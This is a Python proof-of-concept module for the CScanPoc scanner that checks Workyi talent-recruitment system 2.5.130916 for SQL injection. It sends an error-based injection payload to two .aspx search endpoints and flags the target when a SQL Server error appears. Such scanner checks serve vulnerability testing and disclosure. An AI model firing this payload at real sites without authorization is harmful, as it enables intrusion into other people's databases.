# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Workyi_0006'  # 平台漏洞编号，留空
    name = 'Workyi人才系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        基于Asp.Net+MsSQL的开源高端人才系统,人才招聘程序.为创业者带来低投入高回报的人才系统。
        Workyi人才系统两处注入,测试版本：2.5.130916
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0115124'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Workyi人才系统'  # 漏洞应用名称
    product_version = '2.5.130916'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '05f3f046-1b3e-463a-ac4c-5fd897dcc1b9'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/persondh/parttime.aspx?key=",
                "/persondh/highsalary.aspx?key=",
            ]

            data = "%27%20and%20@@version=0%20or%20%27%%27=%27%"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and 'SQL Server' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
